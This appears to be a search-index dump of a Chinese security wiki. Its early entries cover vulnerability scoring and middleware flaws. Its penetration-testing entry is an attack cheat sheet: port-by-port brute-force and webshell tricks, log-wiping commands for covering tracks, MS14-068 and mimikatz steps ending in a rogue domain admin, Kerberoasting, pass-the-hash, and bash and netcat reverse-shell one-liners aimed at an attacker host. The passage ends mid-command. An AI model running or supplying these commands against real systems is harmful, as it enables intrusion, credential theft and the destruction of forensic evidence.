\u57fa\u51c6\u5206\u6570\uff0c\u6682\u65f6\u7684\u548c\u73af\u5883\u7684\u3002\u6bcf\u4e00\u4e2a\u5206\u6570\u90fd\u8981\u8861\u91cf\u8fd9\u4e2a\u5b89\u5168\u6f0f\u6d1e\u7684\u4e0d\u540c\u5c5e\u6027\u3002\u7532\u9aa8\u6587\u5728\u4e25\u91cd\u8865\u4e01\u66f4\u65b0\u6587\u4ef6\u4e2d\u63d0\u4f9b\u8fd9\u4e2a\u201c\u57fa\u51c6\u5206\u6570\u201d\u3002\u8fd9\u4e2a\u57fa\u51c6\u5206\u6570\u6709\u5982\u4e0b\u7279\u70b9\uff1a - \u8fd9\u4e2a\u57fa\u51c6\u5206\u6570\u5177\u4f53\u6307\u4e00\u4e2a\u6307\u5b9a\u7684\u5b89\u5168\u6f0f\u6d1e\u3002 - \u8fd9\u4e2a\u57fa\u51c6\u5206\u6570\u662f\u4e0d\u53d8\u7684\u3002 - \u5b83\u4e0d\u662f\u5177\u4f53\u9488\u5bf9\u4e00\u4e2a\u5ba2\u6237\u7684\u6280\u672fIT\u73af\u5883\u7684","title":"10. *\u540d\u8bcd\u89e3\u91ca*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#11","text":"\u00fc \u4ee5\u5b89\u5168\u9632\u5fa1\u65b9\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u9632\u5fa1\u7684\u5e7f\u5ea6\u6bd4\u6df1\u5ea6\u66f4\u5177\u4f18\u5148\u7ea7\uff0c\u8fd9\u4e5f\u662f\u4fe1\u606f\u5b89\u5168\u4e2d\u6728\u6876\u539f\u7406\u7684\u4f53\u73b0\u3002 \u00fc \u7f51\u7edc\u4e16\u754c\u5982\u6b64\u7684\u5e74\u8f7b\uff0c\u8fd8\u6ca1\u6709\u53d1\u5c55\u51fa\u81ea\u5df1\u72ec\u7acb\u7684\u884c\u4e3a\u89c4\u8303\u3002 \u00fc \u6211\u8ba4\u4e3a\u5b89\u5168\u7684\u6838\u5fc3\u7406\u5ff5\u53ea\u6709\u4e24\u79cd\uff1a \u4e00\u662f\u5bf9\u65e0\u5e8f\u7684\u5185\u5916\u73af\u5883\u6267\u884c\u7ebf\u6027\u79e9\u5e8f\u5316\u7b56\u7565\uff0c\u6784\u5efa\u5f3a\u97e7\u7684\u9632\u62a4\u4f53\u7cfb\uff0c\u4e3a\u7cfb\u7edf\u63d0\u4f9b\u201c\u514d\u75ab\u201d\u80fd\u529b\u3002 \u4e8c\u662f\u5bf9\u65e0\u5e8f\u7684\u5185\u5916\u73af\u5883\u6267\u884c\u975e\u7ebf\u6027\u79e9\u5e8f\u5316\u7b56\u7565\uff0c\u6784\u5efa\u53cd\u8106\u5f31\u6027\u9632\u62a4\u4f53\u7cfb\uff0c\u4e3a\u7cfb\u7edf\u63d0\u4f9b\u201c\u8fdb\u5316\u201d\u80fd\u529b\u3002 --------\u5b89\u5728 \u00fc \u5b89\u5168\u7684\u4e09\u8981\u7d20\uff1a\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u3001\u53ef\u7528\u6027 \u00fc \u9632\u5fa1\u7684\u4e00\u4e9b\u601d\u60f3\uff1a \u767d\u540d\u5355\u601d\u60f3\u3001\u6df1\u5ea6\u9632\u5fa1\u3001\u6570\u636e\u4e0e\u4ee3\u7801\u5206\u79bb\u3001\u4e0d\u53ef\u9884\u6d4b\u6027\u3001\u7f29\u5c0f\u653b\u51fb\u9762","title":"11. *\u90a3\u4e9b\u7f51\u7edc\u5927\u725b\u4eec\u7684\u8bed\u53e5*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#12","text":"\u6211\u7684\u4e00\u4e9b\u7406\u89e3\uff1a 1\u3001\u5b89\u5168\u4e2d\u603b\u8c08\u5230\u505a\u5b89\u5168\u9700\u8981\u9996\u5148\u786e\u8ba4\u4fe1\u4efb\u57df\u4e0e\u4fe1\u4efb\u8fb9\u754c\uff0c\u4fe1\u4efb\u8fb9\u754c\u7684\u6982\u5ff5\u4e3b\u8981\u662f\u4ece\u8fd9\u4e2a\u7f51\u7edc\u7269\u7406\u7ed3\u6784\u4f53\u7cfb\u7684\u5f62\u5f0f\u6765\u4f53\u73b0\u7684\uff0c\u6bd4\u5982\u4e00\u822c\u5728\u7f51\u95f8\u6216\u8005\u9632\u706b\u5899\u4e4b\u7c7b\u7684\u7684\u8bbe\u5907\u5904\u4f5c\u4e3a\u8fb9\u754c\uff0c\u5185\u90e8\u5f62\u6210\u4e00\u4e2a\u4e2a\u5b89\u5168\u57df\u3002\u800c\u6211\u4eec\u7684\u4e92\u8054\u7f51\u7cfb\u7edf\u662f\u4ee5\u4e91\u4e3a\u4f9d\u6258\uff0c\u6253\u7834\u4e86\u539f\u6765\u7684\u90a3\u79cd\u6982\u5ff5\u3002\u7269\u7406\u5c42\u5bf9\u6211\u4eec\u6765\u8bf4\u662f\u4e0d\u900f\u660e\u7684\uff0c\u4ee5\u670d\u52a1\u63d0\u4f9b\u5546\u7684\u903b\u8f91\u670d\u52a1\u5f62\u5f0f\u4f53\u73b0\u4e3a8\u53f0\u670d\u52a1\u5668\uff0c2\u53f0\u6570\u636e\u5e93\u670d\u52a1\u5668\uff0c2\u53f0\u8d1f\u8f7d\u5747\u8861\u670d\u52a1\u5668\u3002\u5e76\u4e14\u8fd9\u4e9b\u670d\u52a1\u5668\u4e4b\u95f4\u5e76\u6ca1\u6709\u914d\u7f6e\u76f8\u4e92\u7684\u4fe1\u4efb\u5173\u7cfb\uff0c\u8fd9\u5c31\u5f62\u6210\u4e86\u6211\u4eec\u7684\u5b89\u5168\u5b9e\u9645\u5f62\u6001\u4e3a\u591a\u5904\u5355\u70b9\u5f62\u5f0f\u3002 \u4ed4\u7ec6\u6765\u770b\u8fd912\u4e2a\u5355\u70b9\uff0c\u9996\u51482\u53f0\u8d1f\u8f7d\u5747\u8861\uff0c\u53ea\u63d0\u4f9b\u8d1f\u8f7d\u5747\u8861\u670d\u52a1\u5176\u4ed6\u5747\u4e0d\u9700\u8981\u6211\u4eec\u770b\u62a4\uff0c\u5176\u505a\u4e86\u54ea\u4e9b\u63aa\u65bd\u9664\u4e86\u5206\u914d\u8fde\u63a5\u5916\u4e00\u6982\u4e0d\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u6211\u4eec\u7684\u5b89\u5168\u5f62\u6001\u5708\u6452\u5f03\u6389\u3002\u5269\u4e0b\u768410\u53f0\u670d\u52a1\u5668\uff0c\u5f7c\u6b64\u72ec\u7acb\uff0c\u4e92\u76f8\u4e0d\u5e94\u8be5\u4fe1\u4efb\uff0c\u5f7c\u6b64\u4ea4\u4e92\u5747\u5e94\u8be5\u6709\u6709\u6548\u8ba4\u8bc1\u884c\u4e3a\u3002 \u5f53\u7136\uff0c\u5176\u5f7c\u6b64\u7684\u4ea4\u4e92\u4e5f\u88ab\u5206\u4e3a\u4e86\u4e24\u79cd\uff0c\u4e00\u662f\u5927\u7f51\u4ea4\u4e92\uff0c\u4e8c\u662f\u5185\u7f51\u4ea4\u4e92\u3002\u8fd9\u91cc\u7684\u5927\u7f51\u5185\u7f51\u6211\u4eec\u5c31\u9700\u8981\u548c\u963f\u91cc\u7684\u7f51\u7edc\u76f8\u7ed3\u5408\u3002\u5185\u7f51\u4ea4\u4e92\u5c31\u5728\u963f\u91cc\u7684\u76f8\u5bf9\u5b89\u5168\u7684\u4e00\u4e2a\u57df\uff0c\u4e0d\u9632\u53eb\u5185\u57df\uff0c\u76f8\u5bf9\u7684\u5927\u7f51\u4ea4\u4e92\u5c31\u5728\u963f\u91cc\u7684\u76f8\u5bf9\u4e0d\u5b89\u5168\u7684\u57df\u548c\u4e92\u8054\u7f51\u4e0a\u4e86\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0d\u53ef\u4fe1\u7684\u4e0d\u5b89\u5168\u7684\u533a\u57df\uff0c\u4e0d\u9632\u53eb\u5916\u57df\u3002\u8fd9\u79cd\u7ed3\u6784\u5c31\u5e94\u8be5\u548c\u6211\u4eec\u7684\u4e1a\u52a1\u76f8\u7ed3\u5408\uff0c\u6bd4\u5982\u6211\u4eec\u768410\u53f0\u670d\u52a1\u5668\u8981\u5f7c\u6b64\u8bbf\u95ee\uff0c\u540c\u65f6\u6b64\u8bbf\u95ee\u670d\u52a1\u4e0d\u9700\u8981\u63d0\u4f9b\u7ed9\u4e92\u8054\u7f51\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u628a\u4e1a\u52a1\u5355\u72ec\u914d\u7f6e\u5230\u5185\u57df\uff0c\u5982\u679c\u4e1a\u52a1\u662f\u63d0\u4f9b\u7ed9\u4e92\u8054\u7f51\u7684\uff0c\u90a3\u4e48\u914d\u7f6e\u5230\u5916\u57df\u6216\u8005\u5185\u57df\u548c\u5916\u57df\u3002","title":"12. *\u5176\u4ed6*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","text":"","title":"\u5e94\u6025\u54cd\u5e94"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/","text":"","title":"\u6570\u636e\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/","text":"\u4e2d\u95f4\u4ef6\u662f\u4e00\u79cd\u5e94\u7528\u4e8e\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u57fa\u7840\u8f6f\u4ef6 \u5c31\u662f\u201c\u5904\u4e8e\u4e2d\u95f4\u7684\u8f6f\u4ef6 \u64cd\u4f5c\u7cfb\u7edf\u3001\u6570\u636e\u5e93\u88ab\u79f0\u4e3a\u7cfb\u7edf\u8f6f\u4ef6\u7684\u4e09\u9a7e\u9a6c\u8f66 \u4e2d\u95f4\u4ef6\u662f\u4e00\u79cd\u5e94\u7528\u4e8e\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u57fa\u7840\u8f6f\u4ef6\uff0c\u867d\u7136\u4ece\u5b57\u9762\u4e0a\u89e3\u91ca \u5904\u4e8e\u4e2d\u95f4\u7684\u8f6f\u4ef6\u201d\u4f46\u5374\u5728\u7cfb\u7edf\u4e2d\u5360\u6709\u91cd\u8981\u4f5c\u7528\uff0c \u6570\u636e\u5e93\u88ab\u79f0\u4e3a\u7cfb\u7edf\u8f6f\u4ef6\u7684\u4e09\u9a7e\u9a6c\u8f66 \uff0c \u4e00. IIS \u00b6 PUT \u6f0f\u6d1e \u77ed\u6587\u4ef6\u540d\u731c\u89e3 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c(CVE-2017-7269)) \u89e3\u6790\u6f0f\u6d1e \u8ba4\u8bc1\u7ed5\u8fc7\uff08 : i30: i30: INDEX_ALLOCATION \uff09 \u4e8c. Apache \u00b6 \u89e3\u6790\u6f0f\u6d1e \u76ee\u5f55\u904d\u5386 \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e rce \u53cd\u5e8f\u5217\u5316 \u4e09. Nginx \u00b6 \u6587\u4ef6\u89e3\u6790 \u76ee\u5f55\u904d\u5386 CRLF \u6ce8\u5165 \u76ee\u5f55\u7a7f\u8d8a \u56db. Tomcat \u00b6 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u6587\u4ef6\u8bfb\u53d6/\u5305\u542b\u6f0f\u6d1e \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u8fdb\u7a0b\u6ce8\u5165","title":"\u670d\u52a1\u5668\u3001\u4e2d\u95f4\u4ef6\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/#iis","text":"PUT \u6f0f\u6d1e \u77ed\u6587\u4ef6\u540d\u731c\u89e3 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c(CVE-2017-7269)) \u89e3\u6790\u6f0f\u6d1e \u8ba4\u8bc1\u7ed5\u8fc7\uff08 : i30: i30: INDEX_ALLOCATION \uff09","title":"\u4e00. IIS"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/#apache","text":"\u89e3\u6790\u6f0f\u6d1e \u76ee\u5f55\u904d\u5386 \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e rce \u53cd\u5e8f\u5217\u5316","title":"\u4e8c. Apache"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/#nginx","text":"\u6587\u4ef6\u89e3\u6790 \u76ee\u5f55\u904d\u5386 CRLF \u6ce8\u5165 \u76ee\u5f55\u7a7f\u8d8a","title":"\u4e09. Nginx"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/#tomcat","text":"\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u6587\u4ef6\u8bfb\u53d6/\u5305\u542b\u6f0f\u6d1e \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u8fdb\u7a0b\u6ce8\u5165","title":"\u56db. Tomcat"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","text":"","title":"\u6d41\u91cf\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u6e17\u900f\u601d\u8def \u00b6 \u7aef\u53e3\u5bf9\u5e94\u7684\u670d\u52a1 \u00b6 21\u7aef\u53e3\uff0cftp \u53ef\u7206\u7834\u6216\u8005\u5c1d\u8bd5\u533f\u540danonymous/\u7a7a\u767b\u5f55 21 ftp \u53ef\u7206\u7834 \u533f\u540danonymous/\u7a7a\u767b\u5f55 MS12-073 22 ssh \u7206\u7834 28\u4e2a\u9000\u683c 23 telnet \u7206\u7834 25 smtp \u90ae\u4ef6\u4f2a\u9020 53 dns dns\u533a\u57df\u4f20\u8f93dns\u52ab\u6301 dns\u7f13\u5b58\u6295\u6bd2 dns\u6b3a\u9a97 \u6df1\u5ea6\u5229\u7528\u5229\u7528dns\u96a7\u9053\u6280\u672f\u523a\u5934\u9632\u706b\u5899 67/68 dhcp \u52ab\u6301\u6b3a\u9a97 80 web 110 pop3 \u7206\u7834 139 samba \u672a\u6388\u6743\u8bbf\u95ee \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e 143 iamp \u7206\u7834 445 smb ms08-067 ms17-010\u6ea2\u51fa\u6f0f\u6d1e IPC$\u653b\u51fb 1433 sqlserver \u6ea2\u51fa\u653b\u51fb \u7a7a\u5bc6\u7801\u5165\u4fb5\u30021433\u8fd8\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5c31\u662f\u5982\u679c\u9ed8\u8ba4\u5b89\u88c5\u7684\u8bdd\uff0c\u7528\u6237\u540d\u662fsa,\u5bc6\u7801\u662f\u7a7a\u7684 3306 mysql \u66b4\u7834 \u6210\u529f\u540e\u7528mysql\u5199\u5165webshell\uff0c\u6216\u8005\u6784\u9020vbs\u5199\u5165\u670d\u52a1\u5668\u542f\u52a8\u9879\uff0c\u542f\u52a8\u65f6\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u6253\u5f003389\u7aef\u53e3 8088 hadoop yarn \u8d44\u6e90\u7ba1\u7406\u5668rest api\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u901a\u8fc7curl -v -X POST\u7533\u8bf7\u65b0\u7684application\uff0c\u6784\u9020\u63d0\u4ea4\u4efb\u52a1\u540e\u5373\u53ef\u5728\u76f8\u5e94\u76ee\u5f55\u751f\u6210webshell 8161 apache activeMQ console\u5b58\u5728\u9ed8\u8ba4\u7aef\u53e3\u548c\u9ed8\u8ba4\u5bc6\u7801\u3001\u672a\u6388\u6743\u8bbf\u95ee \u5f53activeMQ\u5f00\u542fput\u8bf7\u6c42\u65f6\u6784\u9020payload\uff08\u5373\u4e0d\u5b58\u5728\u7684\u76ee\u5f55\uff09response\u4f1a\u8fd4\u56de\u76f8\u5e94\u7684\u7269\u7406\u8def\u5f84\u4fe1\u606f\uff0c\u5f53fileserver\u5b58\u5728\u65f6\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20jspwebshell\uff0c activeMQ\u8fd8\u652f\u6301move\u534f\u8bae\uff0c\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u79fb\u52a8\u6f0f\u6d1e 6379 redis \u914d\u7f6e\u4e0d\u5f53\u7684\u672a\u6388\u6743 \u94fe\u63a5redis\uff08./redis-cli -h IP)\uff0c\u53ef\u5b9e\u73b0\u5199\u5165webshell\uff0c\u5199\u5165crontab\u8ba1\u5212\u4efb\u52a1fantanshell\uff0c\u4ee5\u53ca\u5199\u5165ssh\u516c\u94a5\uff0c\u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650 \u66b4\u7834 11211 memcached \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0ctelnet ip\u5c31\u53ef\u4ee5\u83b7\u5f97\u670d\u52a1\u5668\u654f\u611f\u4fe1\u606f \u6d41\u7a0b \u00b6 \u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u6316\u6398 \u6f0f\u6d1e\u5229\u7528&\u6743\u9650\u63d0\u5347 \u6e05\u9664\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u62a5\u544a \u5165\u4fb5Linux\u540e\u8981\u6e05\u695a\u7684\u65e5\u5fd7 \u00b6 web sed -i -e \u5b9a\u5411\u6e05\u695a access.log, error.log history ~/bash_history wtmp /var/log/wtmp \u767b\u5f55\u65e5\u5fd7 /var/log/secure \u57df\u5185\u6a2a\u5411\u79fb\u52a8 \u00b6 MS14-068 kerkeo klist klist purge \u5220\u9664\u6240\u6709\u7968\u636e \u76f4\u63a5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all \u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u @ -s -d -p MS14-068.exe -u zhangsanfeng@qianxiao996.com -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123 <br/>\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6<br>\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e<br> mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d <br>\u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all<br>\u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword><br/>MS14-068.exe -u <a href=\"&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;\">&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;</a> -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123<code>&lt;br/&gt;\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6&lt;br&gt;\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e&lt;br&gt;</code>mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1<br/>mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1<br/>mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d<code>&lt;br&gt;&lt;br/&gt;\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\\\qianxiao996-dm.qianxiao996.com\\Cmimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d</code><br><br/>\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u4f7f\u7528PSTools\u76ee\u5f55\u4e0b\u7684PsExec.exe\u83b7\u53d6shell:PsExec.exe \\qianxiao996-dm.qianxiao996.com cmd.exe \u6dfb\u52a0\u57df\u7ba1\u7406\u5458net user wangergou ABCabc123 /add /domain net group \"Domain admins\" wangergou /add /domain 0x02.GPP\u6f0f\u6d1e \u7ec4\u7b56\u7565\u4e0b\u53d1 \u7ba1\u7406\u5de5\u5177\u4e2d\u6253\u5f00\u7ec4\u7b56\u7565\u7ba1\u7406\uff1a\u9009\u62e9\u57df\uff0c\u5e76\u65b0\u5efa\u7ec4\u7ec7\u5355\u4f4d\uff1a\u9009\u62e9\u65b0\u5efa\u7684\u7ec4\u7ec7\u5355\u4f4d\uff0c\u5e76\u5efa\u7acbGPO\uff1a\u70b9\u51fb\u65b0\u5efa\u7684GPO\uff1a\u8bbe\u5b9a\u7ec4\u7b56\u7565\u4f5c\u7528\u8303\u56f4\uff1a\uff08\u9009\u62e9\u4e00\u4e2a\u7ec4\uff0c\u5fc5\u987b\u662f\u5b58\u5728\u7684\u7ec4\uff09\u53f3\u952e\u9009\u62e9GPO\uff0c\u9009\u62e9\u7f16\u8f91\u2013\u672c\u5730\u7528\u6237\u548c\u7ec4\uff1a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237\uff1a\u57df\u6210\u5458\u4e0a\u66f4\u65b0\u7ec4\u7b56\u7565\uff0c\u5e76\u67e5\u770b\u7528\u6237:gpupdate net user 0x03.SPN\u7968\u636e\u7834\u89e3 \u5217\u51fa\u5f53\u524d\u7528\u6237\u7684\u7968\u636e\uff1aKerberos::list \u5bfc\u51fa\u7968\u636e\uff1aKerberos::list /export \u7531\u4e8e\u52a0\u5bc6\u7c7b\u578b\u662fRC4_HMAC_MD5\uff0cKerberos\u534f\u8bae\u7b2c\u56db\u6b65TGS-REP\u5c06\u4f1a\u8fd4\u56de\u7528\u670d\u52a1\u5e10\u6237\u7684NTLM\u5bc6\u7801\u54c8\u5e0c\u52a0\u5bc6\u7684\u7968\u636e\u3002 \u4f7f\u7528\u5b57\u5178\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff1a\uff082.txt\u4e3a\u5b57\u5178\uff09python tgsrepcrack.py 2.txt \"1-40a10000-linghuchong@MSSQLSvc College-DS1 1433-COLLEGE.COM.kirbi\" \u867d\u7136\"sekurlsa::pth\"\u5728mimikatz\u4e2d\u88ab\u79f0\u4e4b\u4e3a\"Pass The Hash\",\u4f46\u662f\u5176\u5df2\u7ecf\u8d85\u8d8a\u4e86\u4ee5\u524d\u7684\"Pass The Hash\"\uff0c\u90e8\u5206\u4eba\u5c06\u5176\u547d\u540d\u4e3a\"Overpass-the-hash\"\uff0c\u4e5f\u5c31\u662f\"Pass-the-key\" \u767b\u5f55\u57df\u6210\u5458\u673a\u5668\uff0c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8fd0\u884cmimikatz\uff0c\u5e76\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\uff1a privilege::debug log sekurlsa::logonpasswords \u53cd\u5f39shell \u00b6 Windows: powersnell \u53cd\u5f39shell\u3001powercat \u53cd\u5f39shell Linux: bash \u53cd\u5f39shell\u3001netcat \u53cd\u5f39shell\u3001wget \u53cd\u5f39shell\u3001python \u53cd\u5f39shell\u3001 php\u53cd\u5f39shell \u4e00\u4e9b\u811a\u672c bash \u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6267\u884c\u7aef\u53e3\u76d1\u542c\uff1a nc -lvvp port //port \u4e3a\u653b\u51fb\u4e3b\u673a\u7aef\u53e3\u53f7\uff0c\u5e76\u4e14\u6b64\u7aef\u53e3\u53f7\u6ca1\u6709\u88ab\u5360\u7528 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff1a bash -i >& /dev/tcp/\u653b\u51fb\u4e3b\u673aip/port 0>&1 //port \u4e3a\u653b\u51fb\u4e3b\u673a\u7aef\u53e3\u53f7 \u89e3\u91ca\uff1a bash -i \u6253\u5f00\u4e00\u4e2a\u4ea4\u4e92\u7684bash & \u5c06\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa /dev/tcp/x.x.x.x/port \u610f\u4e3a\u8c03\u7528socket,\u5efa\u7acbsocket\u8fde\u63a5,\u5176\u4e2dx.x.x.x\u4e3a\u8981\u53cd\u5f39\u5230\u7684\u4e3b\u673aip\uff0cport\u4e3a\u7aef\u53e3 0>&1 \u6807\u51c6\u8f93\u5165\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u5b9e\u73b0\u4f60\u4e0e\u53cd\u5f39\u51fa\u6765\u7684shell\u7684\u4ea4\u4e92 /dev/tcp/ \u662fLinux\u4e2d\u7684\u4e00\u4e2a\u7279\u6b8a\u8bbe\u5907,\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\u5c31\u76f8\u5f53\u4e8e\u53d1\u51fa\u4e86\u4e00\u4e2asocket\u8c03\u7528\uff0c\u5efa\u7acb\u4e00\u4e2asocket\u8fde\u63a5\uff0c\u8bfb\u5199\u8fd9\u4e2a\u6587\u4ef6\u5c31\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2asocket\u8fde\u63a5\u4e2d\u4f20\u8f93\u6570\u636e\u3002\u540c\u7406\uff0cLinux\u4e2d\u8fd8\u5b58\u5728/dev/udp/\u3002 \u5176\u4ed6\u7248\u672c\uff1a exec 5<>/dev/tcp/x.x.x.x/9999 cat <&5 | while read line; do $line 2>&5 >&5; done \u7b2c\u4e00\u6761\u547d\u4ee4 \u5efa\u7acb\u4e0ex.x.x.x:9999\u7684tcp\u8fde\u63a5\uff0c\u5e76\u5c06\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u4f5c\u4e3adevice 5\u7684\u6807\u51c6\u8f93\u5165\u8f93\u51fa \u7b2c\u4e8c\u6761cat <&5 \u83b7\u53d6device5\u7684\u8f93\u5165; while read line; do $line 2>&5 >&5 \u4e00\u65e6\u83b7\u53d6\u5230\u547d\u4ee4\u4fbf\u8fd0\u884c \u7136\u540e\u5c06\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u4ee5\u53ca\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u5230device5\u4e2d nc(netcat)\u53cd\u5f39 \u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u6267\u884c\u7aef\u53e3\u76d1\u542c\uff1a nc -lvvp port //port \u4e3a\u653b\u51fb\u4e3b\u673a\u7aef\u53e3\u53f7\uff0c\u5e76\u4e14\u6b64\u7aef\u53e3\u53f7\u6ca1\u6709\u88ab\u5360\u7528 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\uff1a nc -e /bin/bash \u653b\u51fb\u4e3b\u673aip port \u8fd8\u53ef\u4ee5\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u8fd9\u6837\u6267\u884c nc x.x.x.x 1234|/bin/bash|nc 